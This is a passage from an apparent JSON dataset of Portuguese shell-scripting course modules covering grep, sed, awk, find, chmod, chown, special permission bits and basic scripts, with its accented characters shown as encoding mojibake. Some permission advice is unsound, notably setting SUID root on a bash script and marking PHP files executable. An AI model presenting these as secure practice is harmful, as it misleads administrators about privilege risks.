/var/log/nginx/access.log\n127.0.0.1 - - [01/Jan/2024:10:32:11] \"GET /index.html\"\n127.0.0.1 - - [01/Jan/2024:10:32:12] \"GET /style.css\"\n# Novas linhas aparecem automaticamente!\n```\n\n**Op√ß√µes √öteis do `tail`:**\n\n| Op√ß√£o | Descri√ß√£o | Exemplo |\n|-------|-----------|---------|\n| `-n N` | Mostra N linhas | `tail -n 20 servidor.log` |\n| `-f` | Segue arquivo em tempo real | `tail -f app.log` |\n| `-F` | Segue arquivo mesmo se recriado | `tail -F app.log` |\n| `-c N` | Mostra N bytes | `tail -c 100 arquivo.txt` |\n| `+N` | Mostra a partir da linha N | `tail -n +900 arquivo.log` |\n\n> **üí° Dica de Mestre**  \n> Use `tail -f <arquivo>` para rastrear as √∫ltimas entradas de um arquivo. A sa√≠da ser√° atualizada em tempo real √† medida que novas linhas s√£o adicionadas. Essencial para monitorar logs.\n\n### üé£ `grep` - O Ca√ßador de Padr√µes\n\n> **\"grep n√£o √© um comando, √© um estilo de vida.\"**  \n> *- Administrador de Sistemas An√¥nimo*\n\n`grep` √© uma das utilidades mais poderosas para filtrar dados. Procura por linhas que contenham um padr√£o de texto espec√≠fico (ou uma express√£o regular) e exibe apenas as linhas correspondentes.\n\n#### üéØ BUSCA B√ÅSICA:\n\n**Procurando uma Palavra:**\n```bash\n$ grep \"password\" config_files/*\nconfig_files/db.conf:password=secret123\nconfig_files/app.conf:#password commented out\n```\n\n**Ignorando Mai√∫sculas/Min√∫sculas:**\n```bash\n$ grep -i \"error\" system.log\nERROR: Disk full\nError: Permission denied\nerror: File not found\n```\n\n#### üöÄ OP√á√ïES PRINCIPAIS DO `grep`:\n\n| Op√ß√£o | Descri√ß√£o | Exemplo |\n|-------|-----------|---------|\n| `-i` | Ignora mai√∫sc/min√∫sc | `grep -i 'erro' arquivo.log` |\n| `-r` | Busca recursiva | `grep -r 'function' /home/projetos/` |\n| `-n` | Mostra n√∫mero da linha | `grep -n 'warning' sistema.log` |\n| `-v` | Inverte busca (tudo EXCETO) | `grep -v 'coment√°rio' script.sh` |\n| `-c` | Conta ocorr√™ncias | `grep -c 'sucesso' log.txt` |\n| `-l` | Lista arquivos que cont√™m | `grep -l 'TODO' *.py` |\n| `-E` | Usa express√µes regulares | `grep -E 'error\\|warning' log.txt` |\n| `-A n` | Mostra n linhas ap√≥s | `grep -A 3 'Exception' trace.log` |\n| `-B n` | Mostra n linhas antes | `grep -B 2 'FAILED' test.log` |\n| `-C n` | Mostra n linhas contexto | `grep -C 2 'critical' app.log` |\n| `-w` | Palavra completa | `grep -w 'test' arquivo.txt` |\n| `-x` | Linha inteira | `grep -x 'linha exata' arquivo.txt` |\n\n#### üí° EXEMPLOS PR√ÅTICOS:\n\n```bash\n# Buscar por processo espec√≠fico\nps aux | grep 'nginx'\n\n# Buscar arquivos de configura√ß√£o que cont√™m 'port'\ngrep -r 'port' /etc/\n\n# Buscar m√∫ltiplos padr√µes\ngrep -e 'error' -e 'warning' -e 'fatal' app.log\n\n# Buscar com regex para IPs\ngrep -E '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}' access.log\n\n# Pipe com outros comandos\ncat large_file.txt | grep 'pattern' | head -20\n\n# Verificando se servi√ßo est√° rodando\nps aux | grep nginx\n\n# Contando ocorr√™ncias\ngrep -c \"GET\" access.log\n\n# Busca recursiva em diret√≥rios\ngrep -r \"function deprecated\" src/\n```\n\n### ‚úÇÔ∏è `sed` - O Cirurgi√£o de Texto (Stream Editor)\n\n**Situa√ß√£o:** Voc√™ precisa modificar 1000 arquivos de configura√ß√£o. Manual? Jamais!\n\nO `sed` √© um editor de fluxo que processa texto linha por linha. Ele √© ideal para realizar transforma√ß√µes e substitui√ß√µes de texto de forma n√£o interativa.\n\n#### üéØ SUBSTITUI√á√ÉO B√ÅSICA:\n\n**Substituir Primeira Ocorr√™ncia por Linha:**\n```bash\n$ echo \"foo bar foo\" | sed 's/foo/bar/'\nbar bar foo  # S√≥ a primeira \"foo\" virou \"bar\"\n```\n\n**Substituir Todas as Ocorr√™ncias (Global):**\n```bash\n$ echo \"foo bar foo\" | sed 's/foo/bar/g'\nbar bar bar  # Todas as \"foo\" viraram \"bar\"\n```\n\n#### üöÄ OPERA√á√ïES COMUNS DO `sed`:\n\n| Opera√ß√£o | Sintaxe | Exemplo |\n|----------|---------|---------|\n| Substituir | `s/antigo/novo/g` | `sed 's/http/https/g' config.yaml` |\n| Deletar linhas | `/padr√£o/d` | `sed '/debug/d' log.txt` |\n| Mostrar linhas | `-n 'Np'` | `sed -n '10,20p' arquivo.txt` |\n| Inserir linha | `i\\\\texto` | `sed '1i\\\\# Cabe√ßalho' arquivo.txt` |\n| Adicionar linha | `a\\\\texto` | `sed '$a\\\\# Fim' arquivo.txt` |\n| Modificar in-place | `-i` | `sed -i 's/foo/bar/g' arquivo.txt` |\n\n#### üí° CASOS REAIS:\n\n**Substituir Primeira Ocorr√™ncia:**\n```bash\nsed 's/erro/falha/' log.txt\n```\n\n**Substituir Globalmente:**\n```bash\nsed 's/http/https/g' config.yaml\n```\n\n**Deletar Linhas em Branco:**\n```bash\nsed '/^$/d' arquivo.txt\n```\n\n**Deletar Linhas que cont√™m palavra:**\n```bash\nsed '/debug/d' log.txt\n```\n\n**Modificar Arquivo In-place (CUIDADO!):**\n```bash\n# FA√áA BACKUP ANTES!\ncp config.txt config.txt.backup\nsed -i 's/oldserver/newserver/g' config.txt\n```\n\n**Com Backup Autom√°tico:**\n```bash\nsed -i.bak 's/DEBUG/PRODUCTION/g' app.conf\n# Cria app.conf.bak com vers√£o original\n```\n\n### üîß `awk` - Processamento Colunar\n\n`awk` √© uma linguagem de programa√ß√£o completa especializada em processamento de texto estruturado (como CSV, logs, etc.).\n\n#### üéØ SINTAXE B√ÅSICA:\n\n```bash\nawk 'padr√£o {a√ß√£o}' arquivo\n```\n\n#### üí° EXEMPLOS PR√ÅTICOS:\n\n**Mostrar Coluna Espec√≠fica:**\n```bash\n# Mostrar primeira coluna\nawk '{print $1}' dados.txt\n\n# Mostrar m√∫ltiplas colunas\nawk '{print $1, $3}' dados.txt\n```\n\n**Filtrar por Condi√ß√£o:**\n```bash\n# Filtrar linhas onde col2 > 100\nawk '$2 > 100 {print $1, $2}' vendas.txt\n\n# Filtrar por string\nawk '/ERROR/ {print $0}' log.txt\n```\n\n**C√°lculos:**\n```bash\n# Somar valores da terceira coluna\nawk '{soma += $3} END {print \"Total:\", soma}' valores.txt\n\n# Contar linhas\nawk 'END {print NR}' arquivo.txt\n```\n\n**Formata√ß√£o:**\n```bash\n# Formatar sa√≠da\nps aux | awk '{printf \"%-10s %-10s\n\", $1, $11}'\n\n# Separador personalizado\nawk -F: '{print $1, $3}' /etc/passwd\n```\n\n### üîç `find` - Busca Avan√ßada de Arquivos\n\n**Descri√ß√£o:** Localiza arquivos e diret√≥rios com base em diversos crit√©rios.\n\n#### üéØ SINTAXE B√ÅSICA:\n\n```bash\nfind [caminho] [express√µes]\n```\n\n#### üöÄ CRIT√âRIOS COMUNS:\n\n| Crit√©rio | Descri√ß√£o | Exemplo |\n|----------|-----------|---------|\n| `-name` | Por nome (case-sensitive) | `find . -name \"*.txt\"` |\n| `-iname` | Por nome (case-insensitive) | `find /home -iname \"readme*\"` |\n| `-type` | Por tipo (f=arquivo, d=diret√≥rio) | `find . -type f` |\n| `-size` | Por tamanho | `find /var -size +100M` |\n| `-mtime` | Modifica√ß√£o (dias) | `find . -mtime -7` |\n| `-user` | Por dono | `find /home -user joao` |\n| `-perm` | Por permiss√µes | `find . -perm 644` |\n| `-empty` | Arquivos/diret√≥rios vazios | `find . -empty` |\n\n#### ‚ö° A√á√ïES COM `find`:\n\n```bash\n# Listar apenas\nfind ~/docs -name \"*.pdf\"\n\n# Executar comando em cada resultado\nfind /tmp -name \"*.tmp\" -exec rm {} \\;\n\n# Encontrar e copiar\nfind . -name \"*.jpg\" -exec cp {} /backup/ \\;\n\n# Encontrar arquivos modificados nas √∫ltimas 24h\nfind /var/log -type f -mtime -1\n\n# Encontrar arquivos maiores que 100MB\nfind / -type f -size +100M 2>/dev/null\n\n# Encontrar e deletar arquivos antigos\nfind /tmp -type f -mtime +30 -delete\n\n# Combina√ß√£o com grep\nfind . -type f -name \"*.sh\" -exec grep -l 'function' {} \\;\n```\n\n#### üí° EXEMPLOS AVAN√áADOS:\n\n```bash\n# Arquivos modificados nas √∫ltimas 2 horas\nfind /var/log -type f -mmin -120\n\n# Arquivos entre 1MB e 10MB\nfind . -size +1M -size -10M\n\n# Arquivos com permiss√µes espec√≠ficas\nfind . -perm 755\n\n# Arquivos n√£o pertencentes ao usu√°rio atual\nfind /home -not -user $USER\n\n# M√∫ltiplos crit√©rios\nfind . -name \"*.log\" -size +1M -mtime -7\n```",
    "examples": "```bash\n# Exemplo 1: Monitoramento de logs em tempo real\ntail -f /var/log/nginx/access.log | grep -E \"(404|500|503)\"\n\n# Exemplo 2: An√°lise de logs de erro\ncat app.log | grep -i error | awk '{print $1, $2, $5}' | sort | uniq -c\n\n# Exemplo 3: Processamento de CSV\necho \"nome,idade,cidade\" > dados.csv\necho \"Jo√£o,30,S√£o Paulo\" >> dados.csv\necho \"Maria,25,Rio de Janeiro\" >> dados.csv\ncat dados.csv | awk -F, '{print \"Nome: \" $1 \", Idade: \" $2}'\n\n# Exemplo 4: Limpeza de arquivos tempor√°rios\nfind /tmp -type f -name \"*.tmp\" -mtime +7 -exec rm {} \\;\n\n# Exemplo 5: Substitui√ß√£o em massa\nfind . -name \"*.conf\" -exec sed -i 's/oldhost/newhost/g' {} \\;\n\n# Exemplo 6: Contagem de linhas de c√≥digo\nfind . -name \"*.py\" -exec cat {} \\; | wc -l\n\n# Exemplo 7: Extra√ß√£o de emails de arquivos\ngrep -r -E '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' .\n\n# Exemplo 8: Monitoramento de processos\nps aux | grep -E \"(python|node|java)\" | awk '{print $1, $2, $11}'\n```",
    "summary": "Neste m√≥dulo voc√™ aprendeu a inspecionar e analisar arquivos como um profissional. Dominou a visualiza√ß√£o com `cat`, `less`, `head` e `tail`, sendo capaz de ler arquivos pequenos ou grandes, ver apenas o in√≠cio ou o final, e monitorar logs em tempo real. Aprendeu a buscar padr√µes com `grep` usando express√µes regulares, transformar texto com `sed`, processar dados estruturados com `awk`, e localizar arquivos com crit√©rios avan√ßados usando `find`. Estas ferramentas combinadas tornam voc√™ capaz de analisar qualquer dado textual sem sair do terminal.",
    "estimated_time_minutes": "90"
  },
  {
    "id": "module_3",
    "course_id": "shell_script_completo",
    "title": "Regras do Territ√≥rio",
    "order": "3",
    "description": "Sistema de permiss√µes do Linux/Unix: controle de acesso granular para arquivos e diret√≥rios. Aprenda a definir quem pode ler, escrever e executar seus recursos, garantindo seguran√ßa e organiza√ß√£o no sistema.",
    "learning_objectives": [
      "Interpretar a string de permiss√µes exibida por ls -l",
      "Compreender os tr√™s tipos de permiss√µes: leitura (r), escrita (w), execu√ß√£o (x)",
      "Entender os tr√™s grupos de usu√°rios: dono (u), grupo (g), outros (o)",
      "Modificar permiss√µes usando nota√ß√£o simb√≥lica com chmod",
      "Modificar permiss√µes usando nota√ß√£o octal (num√©rica) com chmod",
      "Alterar propriedade de arquivos e diret√≥rios com chown"
    ],
    "key_concepts": [
      "Permiss√µes Unix/Linux",
      "Nota√ß√£o simb√≥lica",
      "Nota√ß√£o octal",
      "Propriedade de arquivos",
      "Seguran√ßa por permiss√µes",
      "Grupos de usu√°rios",
      "Bits de permiss√£o"
    ],
    "content": "## üõ°Ô∏è M√ìDULO 3: Regras do Territ√≥rio\n\n> *\"Com grandes poderes v√™m grandes permiss√µes.\"*  \n> *- Ben Parker (adaptado para Linux)*\n\nUm territ√≥rio explorado precisa de regras. O sistema de permiss√£o do Unix √© a base da seguran√ßa e da organiza√ß√£o. Aprender a control√°-lo significa definir quem pode acessar e interagir com cada parte do seu trabalho, garantindo a integridade dos seus projetos.\n\n### üîí O Sistema de Permiss√µes Unix/Linux\n\n#### üéØ OS TR√äS TIPOS DE PERMISS√ïES:\n\n| S√≠mbolo | N√∫mero | Significado | Para Arquivos | Para Diret√≥rios |\n|---------|--------|-------------|---------------|-----------------|\n| `r` | 4 | Read (Leitura) | Ver conte√∫do | Listar conte√∫do |\n| `w` | 2 | Write (Escrita) | Modificar | Criar/remover arquivos |\n| `x` | 1 | Execute (Execu√ß√£o) | Executar como programa | Entrar no diret√≥rio |\n\n#### üéØ OS TR√äS GRUPOS DE USU√ÅRIOS:\n\n| S√≠mbolo | Grupo | Descri√ß√£o |\n|---------|-------|-----------|\n| `u` | User (Dono) | Dono do arquivo/diret√≥rio |\n| `g` | Group (Grupo) | Membros do grupo do arquivo |\n| `o` | Others (Outros) | Todos os outros usu√°rios |\n| `a` | All (Todos) | u + g + o (todos acima) |\n\n#### üîç DECIFRANDO `ls -l`:\n\n```bash\n$ ls -l script.sh\n-rwxr-xr-- 1 alice developers 1234 Jan  1 10:00 script.sh\n```\n\n```\n-rwxr-xr--\n‚îú‚îÄ‚îÄ - = arquivo regular (d para diret√≥rio, l para link)\n‚îú‚îÄ‚îÄ rwx = dono (alice) pode ler, escrever, executar\n‚îú‚îÄ‚îÄ r-x = grupo (developers) pode ler e executar\n‚îî‚îÄ‚îÄ r-- = outros podem apenas ler\n```\n\n**Significado das permiss√µes no `ls -l`:**\n```\ndrwxr-xr-x\n‚îú‚îÄ‚îÄ d = diret√≥rio (- para arquivo, l para link)\n‚îú‚îÄ‚îÄ rwx = permiss√µes do dono (ler, escrever, executar)\n‚îú‚îÄ‚îÄ r-x = permiss√µes do grupo\n‚îî‚îÄ‚îÄ r-x = permiss√µes de outros\n```\n\n### üî° `chmod` Simb√≥lico - A Linguagem Humana\n\n#### üéØ SINTAXE:\n\n```bash\nchmod [quem][operador][permiss√µes] arquivo\n```\n\n**Operadores:**\n- `+` Adiciona permiss√£o\n- `-` Remove permiss√£o\n- `=` Define exatamente essas permiss√µes\n\n#### üí° EXEMPLOS PR√ÅTICOS:\n\n**Tornar Script Execut√°vel:**\n```bash\n$ chmod u+x meu_script.sh\n# Apenas o dono ganha permiss√£o de execu√ß√£o\n```\n\n**Arquivo de Configura√ß√£o Restrito:**\n```bash\n$ chmod go-rw config.conf\n# Grupo e outros PERDEM leitura e escrita\n# Resultado: -rw------- (apenas dono pode ler/escrever)\n```\n\n**Diret√≥rio Compartilhado em Equipe:**\n```bash\n$ chmod g+rwx projeto/\n$ chmod o-rwx projeto/\n# Dono: tudo, Grupo: tudo, Outros: nada\n# Resultado: drwxrwx---\n```\n\n**Permiss√µes de Web Server Comuns:**\n```bash\n# Arquivos web precisam ser lidos por todos\n$ chmod a+r *.html *.css\n\n# Mas scripts PHP precisam ser executados\n$ chmod a+rx *.php\n```\n\n**Exemplos Pr√°ticos Completos:**\n\nTornar um arquivo somente leitura para todos:\n```bash\n$ chmod a-w config.json\n# Remove a permiss√£o de escrita para o usu√°rio, grupo e outros\n```\n\n### üî¢ `chmod` Octal - A Matem√°tica do Poder\n\n#### üéØ SISTEMA OCTAL (BASE 8):\n\n| Permiss√£o | Valor | C√°lculo |\n|-----------|-------|---------|\n| `---` | 0 | 0+0+0 |\n| `--x` | 1 | 0+0+1 |\n| `-w-` | 2 | 0+2+0 |\n| `-wx` | 3 | 0+2+1 |\n| `r--` | 4 | 4+0+0 |\n| `r-x` | 5 | 4+0+1 |\n| `rw-` | 6 | 4+2+0 |\n| `rwx` | 7 | 4+2+1 |\n\n#### üí° PERMISS√ïES COMUNS E SEUS SIGNIFICADOS:\n\n```bash\n# 755 - O cl√°ssico para execut√°veis\n$ chmod 755 script.sh\n# rwxr-xr-x: Dono tudo, outros leitura+execu√ß√£o\n\n# 644 - Para arquivos de dados\n$ chmod 644 config.json\n# rw-r--r--: Dono l√™+escreve, outros s√≥ leem\n\n# 600 - Segredo total\n$ chmod 600 senhas.txt\n# rw-------: Apenas dono v√™\n\n# 750 - Compartilhamento em grupo seguro\n$ chmod 750 /dados/equipe/\n# rwxr-x---: Grupo pode entrar e listar, outros nada\n\n# 777 - PERIGO! (nunca use em produ√ß√£o)\n$ chmod 777 diretorio/\n# rwxrwxrwx: Qualquer um faz qualquer coisa\n```\n\nCada permiss√£o √© um valor num√©rico (r=4, w=2, x=1). A soma desses valores define a permiss√£o para cada grupo:\n- rwx: 4+2+1 = 7\n- rw-: 4+2+0 = 6  \n- r-x: 4+0+1 = 5\n\n#### üöÄ CASOS REAIS:\n\n**Configura√ß√£o Segura de Site:**\n```bash\n# Arquivos est√°ticos: todos podem ler\n$ find /var/www/html -type f -exec chmod 644 {} \\;\n\n# Diret√≥rios: todos podem listar/entrar\n$ find /var/www/html -type d -exec chmod 755 {} \\;\n\n# Scripts PHP: execut√°veis pelo servidor web\n$ find /var/www/html -name \"*.php\" -exec chmod 755 {} \\;\n```\n\n**Configura√ß√£o de Backup:**\n```bash\n# Diret√≥rio de backup: apenas dono acessa\n$ chmod 700 /backup/\n\n# Arquivos de backup: apenas dono l√™\n$ chmod 600 /backup/*.tar.gz\n```\n\n### üëë `chown` - Mudando a Propriedade\n\n**Situa√ß√£o:** Voc√™ criou arquivos como root, mas precisa que um usu√°rio normal os acesse.\n\n#### üéØ SINTAXE B√ÅSICA:\n\n```bash\nchown [usuario]:[grupo] arquivo\n```\n\n#### üí° EXEMPLOS:\n\n**Mudar Apenas o Dono:**\n```bash\n$ sudo chown alice relatorio.pdf\n# Agora alice √© dona do arquivo\n```\n\n**Mudar Apenas o Grupo:**\n```bash\n$ sudo chown :developers projeto/\n# Grupo do diret√≥rio agora √© \"developers\"\n```\n\n**Mudar Ambos:**\n```bash\n$ sudo chown alice:developers /dados/compartilhados/\n# Dono: alice, Grupo: developers\n```\n\n**Mudan√ßa Recursiva:**\n```bash\n$ sudo chown -R www-data:www-data /var/www/\n# Todo o diret√≥rio web pertence ao usu√°rio do servidor web\n```\n\n**Op√ß√µes √öteis do `chown`:**\n\n| Op√ß√£o | Descri√ß√£o | Exemplo |\n|-------|-----------|---------|\n| `-R` | Recursivo (diret√≥rios e subdiret√≥rios) | `chown -R user:group pasta/` |\n| `-v` | Modo verboso | `chown -v user arquivo.txt` |\n| `--reference=arquivo` | Usa mesmo dono/grupo de outro arquivo | `chown --reference=modelo.txt novo.txt` |\n\n#### üö® CASO COMUM DE ERRO E SOLU√á√ÉO:\n\n**Problema:** Script n√£o executa mesmo com `chmod +x`\n\n```bash\n$ ./meu_script.sh\n-bash: ./meu_script.sh: Permission denied\n$ ls -l meu_script.sh\n-rwxr-xr-x 1 root root 123 Jan  1 10:00 meu_script.sh\n# Ops, arquivo √© do root, voc√™ √© usu√°rio normal\n```\n\n**Solu√ß√£o:**\n```bash\n$ sudo chown $USER:$USER meu_script.sh\n# OU copie o arquivo para sua √°rea\n$ cp meu_script.sh ~/ && chmod +x ~/meu_script.sh\n```\n\n#### üîê COMPARA√á√ÉO: NOTA√á√ÉO SIMB√ìLICA VS OCTAL\n\n**Nota√ß√£o Simb√≥lica (mais leg√≠vel):**\n```bash\n# F√°cil de entender o que est√° fazendo\nchmod u+x script.sh       # Adiciona execu√ß√£o ao dono\nchmod go-rw config.conf   # Remove leitura/escrita de grupo e outros\nchmod a+r arquivo.txt     # Todos podem ler\n```\n\n**Nota√ß√£o Octal (mais compacta):**\n```bash\n# Mais usado em scripts e configura√ß√µes\nchmod 755 script.sh       # Dono: rwx, Grupo: r-x, Outros: r-x\nchmod 644 config.conf     # Dono: rw-, Grupo: r--, Outros: r--\nchmod 700 segredo.txt     # Apenas dono: rwx\n```\n\n#### üéØ PERMISS√ïES ESPECIAIS:\n\n**SUID (Set User ID) - 4xxx:**\n```bash\n# O arquivo executa com permiss√µes do dono, n√£o do executante\nchmod 4755 /usr/bin/passwd  # Passwd precisa rodar como root\n# Representa√ß√£o: rwsr-xr-x (s no lugar do x do dono)\n```\n\n**SGID (Set Group ID) - 2xxx:**\n```bash\n# Arquivos criados no diret√≥rio herdam o grupo do diret√≥rio\nchmod 2775 /dados/compartilhados/\n# Representa√ß√£o: drwxrwsr-x (s no lugar do x do grupo)\n```\n\n**Sticky Bit - 1xxx:**\n```bash\n# Apenas o dono pode deletar seus arquivos (√∫til para /tmp)\nchmod 1777 /tmp\n# Representa√ß√£o: drwxrwxrwt (t no lugar do x de outros)\n```",
    "examples": "```bash\n# Exemplo 1: Configurando um script seguro\n$ cat > backup.sh << 'EOF'\n#!/bin/bash\n# Script de backup\nbackup_dir=\"/backup/$(date +%Y%m%d)\"\nmkdir -p \"$backup_dir\"\ncp -r /dados/importantes \"$backup_dir/\"\necho \"Backup realizado em: $backup_dir\"\nEOF\n\n$ chmod 750 backup.sh        # Dono: rwx, Grupo: r-x, Outros: nada\n$ chown root:backup backup.sh  # Dono: root, Grupo: backup\n$ ls -l backup.sh\n-rwxr-x--- 1 root backup 152 Jan 1 10:00 backup.sh\n\n# Exemplo 2: Diret√≥rio compartilhado em equipe\n$ sudo mkdir -p /projetos/equipe\n$ sudo chown lider:devs /projetos/equipe\n$ sudo chmod 2770 /projetos/equipe  # SGID ativado\n$ ls -ld /projetos/equipe\ndrwxrws--- 2 lider devs 4096 Jan 1 10:00 /projetos/equipe\n\n# Exemplo 3: Corre√ß√£o de permiss√µes de site\n$ sudo chown -R www-data:www-data /var/www/meusite\n$ sudo find /var/www/meusite -type d -exec chmod 755 {} \\;\n$ sudo find /var/www/meusite -type f -exec chmod 644 {} \\;\n$ sudo find /var/www/meusite -name \"*.php\" -exec chmod 755 {} \\;\n\n# Exemplo 4: Permiss√µes para configura√ß√µes sens√≠veis\n$ echo \"DB_PASSWORD=supersecret\" > .env\n$ chmod 600 .env  # Apenas dono pode ler/escrever\n$ ls -l .env\n-rw------- 1 usuario usuario 25 Jan 1 10:00 .env\n\n# Exemplo 5: Script com SUID para funcionalidade especial\n$ cat > restart_service.sh << 'EOF'\n#!/bin/bash\nsystemctl restart nginx\nEOF\n$ sudo chown root restart_service.sh\n$ sudo chmod 4755 restart_service.sh\n$ ls -l restart_service.sh\n-rwsr-xr-x 1 root root 32 Jan 1 10:00 restart_service.sh\n```",
    "summary": "Neste m√≥dulo voc√™ dominou o sistema de permiss√µes Unix/Linux, aprendendo a ler, interpretar e modificar permiss√µes de arquivos e diret√≥rios. Aprendeu a diferen√ßa entre leitura (r), escrita (w) e execu√ß√£o (x), e como elas se aplicam a arquivos e diret√≥rios. Dominou duas formas de modificar permiss√µes: a nota√ß√£o simb√≥lica (chmod u+x) mais leg√≠vel para humanos, e a nota√ß√£o octal (chmod 755) mais compacta para scripts. Tamb√©m aprendeu a alterar a propriedade de arquivos com chown, configurar permiss√µes especiais (SUID, SGID, Sticky Bit), e aplicar pr√°ticas de seguran√ßa comuns para diferentes cen√°rios como configura√ß√£o de sites, backups e scripts.",
    "estimated_time_minutes": "75"
  },
  {
    "id": "module_4",
    "course_id": "shell_script_completo",
    "title": "Automa√ß√£o com Scripts",
    "order": "4",
    "description": "Transforme sequ√™ncias de comandos em programas automatizados reutiliz√°veis. Aprenda a criar scripts Shell para automatizar tarefas repetitivas, processar dados e criar ferramentas personalizadas.",
    "learning_objectives": [
      "Criar e executar scripts Shell b√°sicos",
      "Declarar e utilizar vari√°veis em scripts",
      "Implementar estruturas de controle condicional (if/else)",
      "Criar loops para repeti√ß√£o de tarefas (for, while)",
      "Definir e chamar fun√ß√µes para modulariza√ß√£o",
      "Processar argumentos de linha de comando",
      "Implementar tratamento b√°sico de erros"
    ],
    "key_concepts": [
      "Shebang (#!)",
      "Vari√°veis e escopo",
      "Estruturas condicionais",
      "Loops e itera√ß√£o",
      "Fun√ß√µes e modularidade",
      "Argumentos do script ($1, $@, $#)",
      "C√≥digos de sa√≠da (exit codes)",
      "Substitui√ß√£o de comando $( )"
    ],
    "content": "## ‚ö° M√ìDULO 4: Automa√ß√£o com Scripts\n\n> *\"Por que fazer manualmente 100 vezes o que um script faz em 1 segundo?\"*\n\n### üìù Seu Primeiro Script - O \"Hello World\" do Shell\n\n#### üéØ ESTRUTURA B√ÅSICA DE UM SCRIPT:\n\n```bash\n#!/bin/bash\n# Este √© um coment√°rio\n# Script: primeiro.sh\n# Autor: Seu Nome\n# Descri√ß√£o: Meu primeiro script Shell\n# Data: 2024-01-01\n\necho \"Ol√°, Mundo do Shell!\"\necho \"Data atual: $(date)\"\necho \"Usu√°rio: $USER\"\necho \"Diret√≥rio atual: $(pwd)\"\n```\n\n#### üîß CRIANDO E EXECUTANDO:\n\n```bash\n# 1. Crie o arquivo\n$ nano primeiro.sh\n\n# 2. Adicione o conte√∫do acima\n\n# 3. Torne execut√°vel\n$ chmod +x primeiro.sh\n\n# 4. Execute\n$ ./primeiro.sh\nOl√°, Mundo do Shell!\nData atual: Mon Jan  1 10:00:00 UTC 2024\nUsu√°rio: seu_usuario\nDiret√≥rio atual: /home/seu_usuario\n```\n\n#### üöÄ O QUE ACONTECE LINHA POR LINHA:\n\n1. `#!/bin/bash` - **Shebang**: Diz ao sistema que este arquivo deve ser executado com Bash\n2. `# Coment√°rios` - Ignorados pelo shell, √∫teis para documenta√ß√£o\n3. `echo` - Imprime texto na tela\n4. `$(comando)` - **Substitui√ß√£o de comando**: Executa o comando e usa sua sa√≠da\n5. `$VARIAVEL` - **Vari√°vel de ambiente**: Expande para o valor da vari√°vel\n\n### ‚ö° Maneiras de Executar Scripts\n\n#### üéØ 4 FORMAS DE EXECUTAR:\n\n```bash\n# 1. Com shebang e permiss√£o de execu√ß√£o (RECOMENDADO)\n$ ./script.sh\n\n# 2. Especificando o interpretador\n$ bash script.sh\n$ sh script.sh\n\n# 3. Executando na mesma sess√£o do shell (muda vari√°veis)\n$ source script.sh\n$ . script.sh  # Forma abreviada\n\n# 4. De qualquer lugar (se estiver no PATH)\n$ export PATH=$PATH:/caminho/para/seus/scripts\n$ nome_do_script\n```\n\n#### üí° QUANDO USAR CADA FORMA:\n\n- `./script.sh` - Para scripts completos e independentes\n- `bash script.sh` - Para testar scripts sem dar permiss√£o\n- `source script.sh` - Para carregar configura√ß√µes/fun√ß√µes no shell atual\n- No PATH - Para comandos que voc√™ usa frequentemente\n\n### üîß Vari√°veis - A Mem√≥ria do Script\n\n#### üéØ VARI√ÅVEIS B√ÅSICAS:\n\n```bash\n#!/bin/bash\n# Declarando vari√°veis\nnome=\"Alice\"\nidade=30\nPI=3.14159\ncaminho=\"/home/$nome/documentos\"\n\n# Usando vari√°veis\necho \"Nome: $nome\"\necho \"Idade: ${idade} anos\"  # {} s√£o opcionais, mas claros\necho \"PI √© aproximadamente $PI\"\necho \"Caminho: $caminho\"\n```\n\n#### üöÄ VARI√ÅVEIS ESPECIAIS (AUTOM√ÅTICAS):\n\n```bash\n#!/bin/bash\necho \"Nome do script: $0\"\necho \"Primeiro argumento: $1\"\necho \"Todos argumentos: $@\"\necho \"N√∫mero de argumentos: $#\"\necho \"PID deste script: $$\"\necho \"√öltimo comando saiu com: $?\"\necho \"Usu√°rio: $USER\"\necho \"Home: $HOME\"\necho \"Shell: $SHELL\"\n```\n\n**Testando:**\n```bash\n$ ./variaveis.sh arg1 arg2 arg3\nNome do script: ./variaveis.sh\nPrimeiro argumento: arg1\nTodos argumentos: arg1 arg2 arg3\nN√∫mero de argumentos: 3\nPID deste script: 12345\n...\n```\n\n#### üí° MANIPULA√á√ÉO DE VARI√ÅVEIS:\n\n```bash\n# Atribui√ß√£o\nnome=\"Jo√£o Silva\"\nidade=25\n\n# Uso com chaves (recomendado)\necho \"Nome: ${nome}\"\necho \"Idade: ${idade} anos\"\n\n# Vari√°veis especiais do script\necho \"Script: $0\"        # Nome do script\necho \"Primeiro arg: $1\"  # Primeiro argumento\necho \"Todos args: $@\"    # Todos argumentos\necho \"N√∫mero de args: $#\" # Quantidade de argumentos\necho \"PID: $$\"           # Process ID\necho \"√öltimo exit: $?\"   # Status do √∫ltimo comando\n\n# Substitui√ß√£o de comando em vari√°vel\ndata_atual=$(date)\nlista_arquivos=$(ls)\nnumero_linhas=$(wc -l arquivo.txt)\n```\n\n### üé≠ Estruturas de Controle - Tomando Decis√µes\n\n#### üéØ `if` - DECIS√ïES SIMPLES:\n\n```bash\n#!/bin/bash\n# Verificar se arquivo existe\narquivo=\"dados.txt\"\n\nif [ -f \"$arquivo\" ]; then\n    echo \"‚úÖ $arquivo existe\"\nelse\n    echo \"‚ùå $arquivo n√£o existe\"\n    echo \"Criando $arquivo...\"\n    touch \"$arquivo\"\nfi\n```\n\n#### üöÄ OPERADORES DE TESTE COMUNS:\n\n**Para Strings:**\n```bash\nif [ \"$var1\" = \"$var2\" ]; then  # Igual\nif [ \"$var1\" != \"$var2\" ]; then # Diferente\nif [ -z \"$var\" ]; then          # String vazia\nif [ -n \"$var\" ]; then          # String n√£o vazia\n```\n\n**Para N√∫meros:**\n```bash\nif [ $a -eq $b ]; then  # Equal (igual)\nif [ $a -ne $b ]; then  # Not equal (diferente)\nif [ $a -gt $b ]; then  # Greater than (maior que)\nif [ $a -lt $b ]; then  # Less than (menor que)\nif [ $a -ge $b ]; then  # Greater or equal (maior ou igual)\nif [ $a -le $b ]; then  # Less or equal (menor ou igual)\n```\n\n**Para Arquivos:**\n```bash\nif [ -f \"arquivo\" ]; then   # Arquivo existe\nif [ -d \"diretorio\" ]; then # Diret√≥rio existe\nif [ -r \"arquivo\" ]; then   # Tem permiss√£o de leitura\nif [ -w \"arquivo\" ]; then   # Tem permiss√£o de escrita\nif [ -x \"arquivo\" ]; then   # Tem permiss√£o de execu√ß√£o\nif [ -s \"arquivo\" ]; then   # Tamanho > 0\n```\n\n#### 